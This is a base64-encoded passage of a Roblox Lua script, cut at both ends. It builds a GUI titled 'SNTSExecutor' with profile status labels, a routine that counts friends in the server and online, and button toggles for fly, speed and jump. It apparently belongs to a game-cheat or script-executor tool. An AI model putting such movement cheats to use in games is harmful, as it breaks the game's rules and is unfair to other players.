VtYW5vaWQuSnVtcFBvd2VyID0gbm9ybWFsSnVtcAplbmQKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0g4pqZ77iPIERlZmF1bHQgQnV0dG9uIFRvZ2dsZXMKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpmbGlnaHRCdXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCglpZiBmbHlpbmcgdGhlbiBzdG9wRmxpZ2h0KCkgZWxzZSBzdGFydEZsaWdodCgpIGVuZAplbmQpCgpzcGVlZEJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCWlmIHNwZWVkRW5hYmxlZCB0aGVuIHN0b3BTcGVlZCgpIGVsc2Ugc3RhcnRTcGVlZCgpIGVuZAplbmQpCgpqdW1wQnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJaWYganVtcEVuYWJsZWQgdGhlbiBzdG9wSnVtcCgpIGVsc2Ugc3RhcnRKdW1wKCkgZW5kCmVuZCkKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuU3RhdHVzCkcyTFsiNDQiXSA9IEluc3RhbmNlLm5ldygiRm9sZGVyIiwgRzJMWyIyNCJdKTsKRzJMWyI0NCJdWyJOYW1lIl0gPSBbW1N0YXR1c11dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLlN0YXR1cy5TdGF0dXMKRzJMWyI0NSJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiNDQiXSk7CkcyTFsiNDUiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjQ1Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjQ1Il1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDApOwpHMkxbIjQ1Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyODksIDAsIDQyKTsKRzJMWyI0NSJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNSwgMCwgMCwgMCk7CkcyTFsiNDUiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI0NSJdWyJOYW1lIl0gPSBbW1N0YXR1c11dOwpHMkxbIjQ1Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuU3RhdHVzLlN0YXR1cy5EYXRlCkcyTFsiNDYiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbIjQ1Il0pOwpHMkxbIjQ2Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI0NiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI0NiJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyI0NiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgOTcsIDAsIDQzKTsKRzJMWyI0NiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAsIDAsIDAuNDQ1MzYsIDApOwpHMkxbIjQ2Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNDYiXVsiTmFtZSJdID0gW1tEYXRlXV07CkcyTFsiNDYiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5TdGF0dXMuU3RhdHVzLkRhdGUuVXNlcm5hbWUKRzJMWyI0NyJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjQ2Il0pOwpHMkxbIjQ3Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI0NyJdWyJUZXh0U2l6ZSJdID0gMTc7CkcyTFsiNDciXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiNDciXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyI0NyJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyMDgsIDIwOCwgMjA4KTsKRzJMWyI0NyJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjQ3Il1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLCAwLjUpOwpHMkxbIjQ3Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA4NCwgMCwgMzMpOwpHMkxbIjQ3Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNDciXVsiVGV4dCJdID0gW1tKb2luZWRdXTsKRzJMWyI0NyJdWyJOYW1lIl0gPSBbW1VzZXJuYW1lXV07CkcyTFsiNDciXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygtMC4wMDYyNCwgMCwgMC4xMzk2MywgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuU3RhdHVzLlN0YXR1cy5EYXRlLlVzZXJuYW1lCkcyTFsiNDgiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyI0NiJdKTsKRzJMWyI0OCJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiNDgiXVsiVGV4dFNpemUiXSA9IDE3OwpHMkxbIjQ4Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjQ4Il1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LlJlZ3VsYXIsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiNDgiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjA4LCAyMDgsIDIwOCk7CkcyTFsiNDgiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyI0OCJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyI0OCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgODQsIDAsIDMzKTsKRzJMWyI0OCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjQ4Il1bIlRleHQiXSA9IFtbTU0vREQvWVlZWV1dOwpHMkxbIjQ4Il1bIk5hbWUiXSA9IFtbVXNlcm5hbWVdXTsKRzJMWyI0OCJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KC0wLjAwNjI0LCAwLCAwLjU1NjI5LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5TdGF0dXMuU3RhdHVzLkRpdmlkZXIKRzJMWyI0OSJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiNDUiXSk7CkcyTFsiNDkiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjQ5Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjQ5Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzLCAwLCAzMyk7CkcyTFsiNDkiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjMzNTY0LCAwLCAwLCAwKTsKRzJMWyI0OSJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjQ5Il1bIk5hbWUiXSA9IFtbRGl2aWRlcl1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLlN0YXR1cy5TdGF0dXMuVUlMaXN0TGF5b3V0CkcyTFsiNGEiXSA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IiwgRzJMWyI0NSJdKTsKRzJMWyI0YSJdWyJTb3J0T3JkZXIiXSA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyOwpHMkxbIjRhIl1bIkZpbGxEaXJlY3Rpb24iXSA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLlN0YXR1cy5TdGF0dXMuSm9pbmVkCkcyTFsiNGIiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbIjQ1Il0pOwpHMkxbIjRiIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI0YiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI0YiJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyI0YiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgOTcsIDAsIDQzKTsKRzJMWyI0YiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAsIDAsIDAuNDQ1MzYsIDApOwpHMkxbIjRiIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNGIiXVsiTmFtZSJdID0gW1tKb2luZWRdXTsKRzJMWyI0YiJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLlN0YXR1cy5TdGF0dXMuSm9pbmVkLkZyaWVuZHNKb2luZWQKRzJMWyI0YyJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjRiIl0pOwpHMkxbIjRjIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI0YyJdWyJUZXh0U2l6ZSJdID0gMTc7CkcyTFsiNGMiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiNGMiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyI0YyJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyMDgsIDIwOCwgMjA4KTsKRzJMWyI0YyJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjRjIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDApOwpHMkxbIjRjIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA4NCwgMCwgMzMpOwpHMkxbIjRjIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNGMiXVsiVGV4dCJdID0gW1swIGZyaWVuZHMgXV07CkcyTFsiNGMiXVsiTmFtZSJdID0gW1tGcmllbmRzSm9pbmVkXV07CkcyTFsiNGMiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIC0wLjI1NTgxLCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5TdGF0dXMuU3RhdHVzLkpvaW5lZC5Kb2luZWQKRzJMWyI0ZCJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjRiIl0pOwpHMkxbIjRkIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI0ZCJdWyJUZXh0U2l6ZSJdID0gMTc7CkcyTFsiNGQiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiNGQiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyI0ZCJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyMDgsIDIwOCwgMjA4KTsKRzJMWyI0ZCJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjRkIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDEpOwpHMkxbIjRkIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA4NCwgMCwgMjYpOwpHMkxbIjRkIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNGQiXVsiVGV4dCJdID0gW1tKb2luZWRdXTsKRzJMWyI0ZCJdWyJOYW1lIl0gPSBbW0pvaW5lZF1dOwpHMkxbIjRkIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLjgzNzIxLCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5TdGF0dXMuU3RhdHVzLkRpdmlkZXIKRzJMWyI0ZSJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiNDUiXSk7CkcyTFsiNGUiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjRlIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjRlIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAzLCAwLCAzMyk7CkcyTFsiNGUiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjMzNTY0LCAwLCAwLCAwKTsKRzJMWyI0ZSJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjRlIl1bIk5hbWUiXSA9IFtbRGl2aWRlcl1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLlN0YXR1cy5TdGF0dXMuT25saW5lCkcyTFsiNGYiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbIjQ1Il0pOwpHMkxbIjRmIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI0ZiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI0ZiJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyI0ZiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgOTcsIDAsIDQzKTsKRzJMWyI0ZiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAsIDAsIDAuNDQ1MzYsIDApOwpHMkxbIjRmIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNGYiXVsiTmFtZSJdID0gW1tPbmxpbmVdXTsKRzJMWyI0ZiJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5EZXRhaWxzLlN0YXR1cy5TdGF0dXMuT25saW5lLkZyaWVuZHNPbmxpbmUKRzJMWyI1MCJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjRmIl0pOwpHMkxbIjUwIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI1MCJdWyJUZXh0U2l6ZSJdID0gMTc7CkcyTFsiNTAiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiNTAiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyI1MCJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyMDgsIDIwOCwgMjA4KTsKRzJMWyI1MCJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjUwIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDApOwpHMkxbIjUwIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA4NCwgMCwgMzMpOwpHMkxbIjUwIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNTAiXVsiVGV4dCJdID0gW1swIGZyaWVuZHMgXV07CkcyTFsiNTAiXVsiTmFtZSJdID0gW1tGcmllbmRzT25saW5lXV07CkcyTFsiNTAiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIC0wLjI1NTgxLCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5TdGF0dXMuU3RhdHVzLk9ubGluZS5PbmxpbmUKRzJMWyI1MSJdID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBHMkxbIjRmIl0pOwpHMkxbIjUxIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI1MSJdWyJUZXh0U2l6ZSJdID0gMTc7CkcyTFsiNTEiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiNTEiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyI1MSJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyMDgsIDIwOCwgMjA4KTsKRzJMWyI1MSJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjUxIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDEpOwpHMkxbIjUxIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA4NCwgMCwgMjYpOwpHMkxbIjUxIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNTEiXVsiVGV4dCJdID0gW1tPbmxpbmVdXTsKRzJMWyI1MSJdWyJOYW1lIl0gPSBbW09ubGluZV1dOwpHMkxbIjUxIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLjgzNzIxLCAwKTsKCi0tLy8gUGxheWVyIFN0YXR1cyBTeXN0ZW0gKE9wdGltaXplZCAmIE5vbi1GcmVlemluZywgZml4ZWQgZnJpZW5kcy1vbmxpbmUpCnRhc2suc3Bhd24oZnVuY3Rpb24oKQoJbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCglsb2NhbCBQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCgoJbG9jYWwgam9pbmVkTGFiZWwgPSBHMkxbIjQ4Il0gLS0gTU0vREQvWVlZWQoJbG9jYWwgZnJpZW5kc0pvaW5lZExhYmVsID0gRzJMWyI0YyJdIC0tIDAgZnJpZW5kcwoJbG9jYWwgZnJpZW5kc09ubGluZUxhYmVsID0gRzJMWyI1MCJdIC0tIDAgZnJpZW5kcwoKCS0tIPCflZMgSm9pbmVkIERhdGUgKGxvY2FsIGRhdGUgb25seSwgbGlnaHR3ZWlnaHQpCglsb2NhbCBkYXRlID0gb3MuZGF0ZSgiKnQiKQoJbG9jYWwgam9pbmVkRGF0ZSA9IHN0cmluZy5mb3JtYXQoIiUwMmQvJTAyZC8lMDRkIiwgZGF0ZS5tb250aCwgZGF0ZS5kYXksIGRhdGUueWVhcikKCWpvaW5lZExhYmVsLlRleHQgPSBqb2luZWREYXRlCgoJLS0g8J+RpSBGcmllbmRzIEN1cnJlbnRseSBpbiBTZXJ2ZXIgKGVmZmljaWVudCkKCWxvY2FsIGZ1bmN0aW9uIHVwZGF0ZUZyaWVuZHNKb2luZWQoKQoJCWxvY2FsIGNvdW50ID0gMAoJCWZvciBfLCBwbHIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwoJCQlpZiBwbHIgfj0gUGxheWVyIGFuZCBQbGF5ZXI6SXNGcmllbmRzV2l0aChwbHIuVXNlcklkKSB0aGVuCgkJCQljb3VudCA9IGNvdW50ICsgMQoJCQllbmQKCQllbmQKCQlmcmllbmRzSm9pbmVkTGFiZWwuVGV4dCA9IHN0cmluZy5mb3JtYXQoIiVkIGZyaWVuZCVzIiwgY291bnQsIGNvdW50ID09IDEgYW5kICIiIG9yICJzIikKCWVuZAoKCS0tIEZhc3QgdXBkYXRlcyB3aGVuIHBsYXllcnMgam9pbi9sZWF2ZQoJdXBkYXRlRnJpZW5kc0pvaW5lZCgpCglQbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3QodXBkYXRlRnJpZW5kc0pvaW5lZCkKCVBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdCh1cGRhdGVGcmllbmRzSm9pbmVkKQoKCS0tIPCfjJAgRnJpZW5kcyBPbmxpbmUgKHNhZmUsIG5vbi1ibG9ja2luZykKCWxvY2FsIGZldGNoSW5Qcm9ncmVzcyA9IGZhbHNlCglsb2NhbCBsYXN0S25vd24gPSAiTi9BIgoKCWxvY2FsIGZ1bmN0aW9uIHVwZGF0ZUZyaWVuZHNPbmxpbmUoKQoJCS0tIGF2b2lkIGNvbmN1cnJlbnQgZmV0Y2hlcwoJCWlmIGZldGNoSW5Qcm9ncmVzcyB0aGVuIHJldHVybiBlbmQKCQlmZXRjaEluUHJvZ3Jlc3MgPSB0cnVlCgoJCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCQlsb2NhbCBvaywgcGFnZXMgPSBwY2FsbChmdW5jdGlvbigpCgkJCQlyZXR1cm4gUGxheWVyczpHZXRGcmllbmRzQXN5bmMoUGxheWVyLlVzZXJJZCkKCQkJZW5kKQoKCQkJaWYgbm90IG9rIG9yIG5vdCBwYWdlcyB0aGVuCgkJCQktLSBBUEkgZmFpbGVkOyBzaG93IGZhbGxiYWNrIGJ1dCBrZWVwIHByZXZpb3VzIGlmIGF2YWlsYWJsZQoJCQkJZnJpZW5kc09ubGluZUxhYmVsLlRleHQgPSBsYXN0S25vd24KCQkJCWZldGNoSW5Qcm9ncmVzcyA9IGZhbHNlCgkJCQlyZXR1cm4KCQkJZW5kCgoJCQlsb2NhbCBvbmxpbmVDb3VudCA9IDAKCQkJbG9jYWwgc3RhcnRUaW1lID0gb3MuY2xvY2soKQoJCQlsb2NhbCBUSU1FT1VUID0gMyAtLSBzZWNvbmRzIG1heCB0byBhdm9pZCBsYWcKCgkJCS0tIGl0ZXJhdGUgcGFnZXMgcHJvcGVybHkgYW5kIHJlc3BlY3QgdGltZW91dAoJCQl3aGlsZSB0cnVlIGRvCgkJCQktLSBzYWZldHkgdGltZW91dAoJCQkJaWYgb3MuY2xvY2soKSAtIHN0YXJ0VGltZSA+IFRJTUVPVVQgdGhlbgoJCQkJCWJyZWFrCgkJCQllbmQKCgkJCQktLSBnZXQgY3VycmVudCBwYWdlIGFuZCBjb3VudCBvbmxpbmUgZnJpZW5kcwoJCQkJbG9jYWwgc3VjY2VzcywgcGFnZSA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0dXJuIHBhZ2VzOkdldEN1cnJlbnRQYWdlKCkgZW5kKQoJCQkJaWYgc3VjY2VzcyBhbmQgcGFnZSB0aGVuCgkJCQkJZm9yIF8sIGZyaWVuZCBpbiBpcGFpcnMocGFnZSkgZG8KCQkJCQkJLS0gZnJpZW5kLklzT25saW5lIGlzIGEgYm9vbGVhbgoJCQkJCQlpZiBmcmllbmQuSXNPbmxpbmUgdGhlbgoJCQkJCQkJb25saW5lQ291bnQgPSBvbmxpbmVDb3VudCArIDEKCQkJCQkJZW5kCgkJCQkJZW5kCgkJCQllbmQKCgkJCQktLSBpZiBmaW5pc2hlZCwgc3RvcDsgb3RoZXJ3aXNlIGFkdmFuY2UKCQkJCWlmIHBhZ2VzLklzRmluaXNoZWQgdGhlbgoJCQkJCWJyZWFrCgkJCQllbmQKCgkJCQktLSB0cnkgYWR2YW5jZTsgaWYgZmFpbHMgYmFpbAoJCQkJbG9jYWwgYWR2T2ssIGFkdlJlcyA9IHBjYWxsKGZ1bmN0aW9uKCkgcmV0dXJuIHBhZ2VzOkFkdmFuY2VUb05leHRQYWdlKCkgZW5kKQoJCQkJaWYgbm90IGFkdk9rIG9yIG5vdCBhZHZSZXMgdGhlbgoJCQkJCWJyZWFrCgkJCQllbmQKCgkJCQktLSB5aWVsZCBhIHRpbnkgYml0IHRvIGF2b2lkIGhvZ2dpbmcgZnJhbWUgdGltZQoJCQkJdGFzay53YWl0KDAuMDUpCgkJCWVuZAoKCQkJLS0gZm9ybWF0IGFuZCBzZXQgbGFiZWwgKHJ1biBvbiBzYW1lIHRocmVhZDsgY2hlYXApCgkJCWxvY2FsIHRleHQgPSBzdHJpbmcuZm9ybWF0KCIlZCBmcmllbmQlcyIsIG9ubGluZUNvdW50LCBvbmxpbmVDb3VudCA9PSAxIGFuZCAiIiBvciAicyIpCgkJCWZyaWVuZHNPbmxpbmVMYWJlbC5UZXh0ID0gdGV4dAoJCQlsYXN0S25vd24gPSB0ZXh0CgoJCQlmZXRjaEluUHJvZ3Jlc3MgPSBmYWxzZQoJCWVuZCkKCWVuZAoKCS0tIEluaXRpYWwgc2FmZSB1cGRhdGUKCXVwZGF0ZUZyaWVuZHNPbmxpbmUoKQoKCS0tIFJlZnJlc2ggZXZlcnkgNjBzLCBidXQgYXZvaWQgb3ZlcmxhcHMgKGZldGNoSW5Qcm9ncmVzcyBwcmV2ZW50cyBjb25jdXJyZW50KQoJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJd2hpbGUgdGFzay53YWl0KDYwKSBkbwoJCQl1cGRhdGVGcmllbmRzT25saW5lKCkKCQllbmQKCWVuZCkKZW5kKQoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLlBQTmF2QmFyCkcyTFsiNTIiXSA9IEluc3RhbmNlLm5ldygiQ2FudmFzR3JvdXAiLCBHMkxbIjFiIl0pOwpHMkxbIjUyIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI1MiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI1MiJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMC41LCAxKTsKRzJMWyI1MiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjk5LCAwLCA1Mik7CkcyTFsiNTIiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjQ4NjAxLCA1LCAwLjkwNTY2LCAwKTsKRzJMWyI1MiJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsI